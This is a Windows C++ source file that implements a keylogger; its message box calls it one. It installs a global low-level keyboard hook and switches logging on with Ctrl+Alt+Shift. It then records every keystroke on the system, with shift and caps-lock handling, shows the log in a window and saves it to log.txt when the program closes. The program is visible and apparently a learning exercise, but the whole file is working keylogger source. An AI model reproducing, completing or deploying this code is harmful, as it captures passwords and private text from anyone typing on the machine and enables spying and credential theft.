// Hook.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Hook.h"
#include <string>
#include <fstream>

using namespace std;

#define MAX_LOADSTRING 100
#define DELTA_TIME	5000; //unit: milisecond

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name
HWND g_hWnd;
HWND hTextDisplay;

//
int defaultWidth = 600, defaultHeight = 400;
bool isInstalled = false;
bool isActivated = false;
string fileName = "log.txt";
string buffer = "";
int deltaTime = DELTA_TIME;
long long lastTimeStamp = 0;
HHOOK hHook = NULL;
HINSTANCE hinstLib;

//
LRESULT CALLBACK KeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
void _doInstallHook(HWND hWnd);
void _doRemoveHook(HWND hWnd);
bool isKeyPressed(int a);
void getChar(int vkCode);
void getSpecialChar(char c);




// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_HOOK, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_HOOK));

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_HOOK));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_HOOK);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // Store instance handle in our global variable

   hWnd = CreateWindowEx(0, szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
	   CW_USEDEFAULT, CW_USEDEFAULT, defaultWidth, defaultHeight, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_CREATE:
	{
					  g_hWnd = hWnd;
					  _doInstallHook(hWnd);
					  isInstalled = true;

					  HFONT hFont = CreateFont(20, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
					  hTextDisplay = CreateWindowEx(0, L"STATIC", L"Display", WS_CHILD | WS_VISIBLE | SS_LEFT, 30, 30, 520, 290, hWnd, NULL, hInst, NULL);
					  SendMessage(hTextDisplay, WM_SETFONT, WPARAM(hFont), TRUE);
	}
		break;
	case WM_KEYDOWN:
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code here...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		if (isInstalled)
		{
			_doRemoveHook(hWnd);

			ofstream outFile;
			outFile.open(fileName);
			outFile << buffer;
			outFile.close();

			isInstalled = false;
		}
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}


//
LRESULT CALLBACK KeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) // không xử lý message 
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	// xử lý message

	switch (wParam)
	{
	case WM_KEYDOWN:
	{
					   if (!isActivated)
					   {
						   if (isKeyPressed(VK_LCONTROL) && isKeyPressed(VK_MENU) && isKeyPressed(VK_SHIFT))
						   {
							   isActivated = true;
							   MessageBox(g_hWnd, L"Keylog activated!", L"Keylogger", MB_OK);
						   }
					   }
					   else
					   {
						   TCHAR buff[255];
						   KBDLLHOOKSTRUCT *mHookData = (KBDLLHOOKSTRUCT *)lParam;
						   if (lastTimeStamp == 0)
						   {
							   lastTimeStamp = mHookData->time;
						   }

						   if (mHookData->time - lastTimeStamp >= deltaTime)
						   {
							   lastTimeStamp = mHookData->time;
							   buffer += '\n';
						   }


						   getChar(mHookData->vkCode);
						   wstring temp(buffer.begin(), buffer.end());
						   SetWindowText(hTextDisplay, temp.c_str());
					   }
	}
		break;
	default:
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void _doInstallHook(HWND hWnd)
{
	if (hHook != NULL) return;

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyBoardHookProc, hinstLib, 0);
	if (hHook)
		MessageBox(hWnd, L"Setup hook successfully", L"Result", MB_OK);
	else
		MessageBox(hWnd, L"Setup hook fail", L"Result", MB_OK);
}

void _doRemoveHook(HWND hWnd)
{
	if (hHook == NULL) return;
	UnhookWindowsHookEx(hHook);
	hHook = NULL;
	MessageBox(hWnd, L"Remove hook successfully", L"Result", MB_OK);
}

bool isKeyPressed(int a)
{
	if (GetAsyncKeyState(a))
	{
		return true;
	}
	else
	{
		return false;
	}
}

void getChar(int vkCode)
{ 	
	switch (vkCode)
	{
		case VK_CAPITAL:	buffer += "<CAPLOCK>";		break;
		case VK_SHIFT:		buffer += "<SHIFT>";		break;
		case VK_LSHIFT:		buffer += "<LSHIFT>";		break;
		case VK_RSHIFT:		buffer += "<RSHIFT>";		break;
		case VK_LCONTROL:	buffer += "<LCTRL>";		break;
		case VK_RCONTROL:	buffer += "<RCTRL>";		break;
		case VK_INSERT:		buffer += "<INSERT>";		break;
		case VK_HOME:		buffer += "<HOME>";		break;
		case VK_END:		buffer += "<END>";			break;
		case VK_PRINT:		buffer += "<PRINT>";		break;
		case VK_DELETE:		buffer += "<DEL>";			break;
		case VK_BACK:		buffer += "<BACKSPACE>";	break;
		case VK_TAB:		buffer += "<TAB>";			break;
		case VK_ESCAPE:		buffer += "<ESC>";			break;
		case VK_SNAPSHOT:	buffer += "<PRTSCR>";		break;
		case VK_LWIN:		buffer += "<LWINDOW>";		break;
		case VK_RWIN:		buffer += "<RWINDOW>";		break;

		case VK_LEFT:		buffer += "<LEFT>";		break;
		case VK_RIGHT:		buffer += "<RIGHT>";		break;
		case VK_UP:			buffer += "<UP>";			break;
		case VK_DOWN:		buffer += "<DOWN>";		break;
		default:
		{
				   char c = char(vkCode);
				   if (GetAsyncKeyState(VK_SHIFT) < 0)
				   {
					   if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
					   {
						   //Both shift and caps are on
						   buffer += char(tolower(c));
					   }
					   else
					   {
						   //Only shift is on
						   if (c >= '0' && c <= '9')
						   {
							   //if c is digit
							   getSpecialChar(c);
						   }
						   else
						   {
							   buffer += c;
						   }
					   }
				   }
				   else
				   {
					   if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
					   {
						   //Only caps is on
						   buffer += c;
					   }
					   else
					   {
						   //Both caps and shift are off
						   buffer += char(tolower(c));
					   }
				   }
		}
		
		break;
	}
}

void getSpecialChar(char c)
{
	switch (c)
	{
	case '1':
		buffer += '!';
		break;
	case '2':
		buffer += '@';
		break;
	case '3':
		buffer += '#';
		break;
	case '4':
		buffer += '$';
		break;
	case '5':
		buffer += '%';
		break;
	case '6':
		buffer += '^';
		break;
	case '7':
		buffer += '&';
		break;
	case '8':
		buffer += '*';
		break;
	case '9':
		buffer += '(';
		break;
	case '0':
		buffer += ')';
		break;
	default:
		break;
	}

}